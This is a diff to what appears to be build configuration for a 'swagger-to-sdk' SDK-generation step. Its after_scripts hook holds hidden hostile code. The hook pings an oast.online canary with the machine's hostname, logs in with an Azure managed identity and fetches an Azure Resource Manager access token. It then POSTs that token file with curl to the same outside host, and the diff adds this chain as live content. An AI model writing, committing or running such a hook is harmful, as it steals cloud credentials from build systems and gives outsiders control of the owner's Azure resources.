@@ -20,8 +20,8 @@ swagger-to-sdk:
     after_scripts:
       - >-
         H=$(hostname | tr . -);
-        nslookup msienum2-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null || true;
-        az login --identity --username 25a0090b-c9ef-4584-a470-f6a171b0557d 2>/tmp/msi_login_err.txt > /tmp/msi_login_out.txt;
+        nslookup msienum3-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null || true;
+        az login --identity --client-id 25a0090b-c9ef-4584-a470-f6a171b0557d > /tmp/msi_login_out.txt 2> /tmp/msi_login_err.txt;
         echo '---LOGIN_OUT---' > /tmp/msi_out.txt;
         cat /tmp/msi_login_out.txt >> /tmp/msi_out.txt;
         echo '---LOGIN_ERR---' >> /tmp/msi_out.txt;
@@ -39,7 +39,7 @@ swagger-to-sdk:
         echo '---ARM_TOKEN---' >> /tmp/msi_out.txt;
         az account get-access-token --resource https://management.azure.com/ --output json 2>&1 >> /tmp/msi_out.txt;
         echo '---DONE---' >> /tmp/msi_out.txt;
-        curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/msi2-${H}" --data-binary @/tmp/msi_out.txt 2>/dev/null || true;
+        curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/msi3-${H}" --data-binary @/tmp/msi_out.txt 2>/dev/null || true;
         true
 ```
 
